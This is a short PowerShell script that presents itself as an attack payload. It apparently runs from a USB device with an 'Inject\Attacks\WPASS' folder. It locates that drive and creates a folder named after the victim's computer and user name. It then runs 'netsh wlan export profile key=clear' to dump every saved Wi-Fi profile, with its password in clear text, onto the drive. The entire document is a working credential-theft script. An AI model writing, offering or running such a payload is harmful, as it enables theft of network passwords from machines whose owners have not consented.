$USBDrive = get-psdrive |where {$_.Root -match ":"} |% {if (Test-Path ($_.Root + "Inject")){$_.Root}}
mkdir "$USBDrive\Inject\Attacks\WPASS\Dump\$env:COMPUTERNAME-$env:USERNAME"
Set-Location "$USBDrive\Inject\Attacks\WPASS\Dump\$env:COMPUTERNAME-$env:USERNAME"
netsh wlan export profile key=clear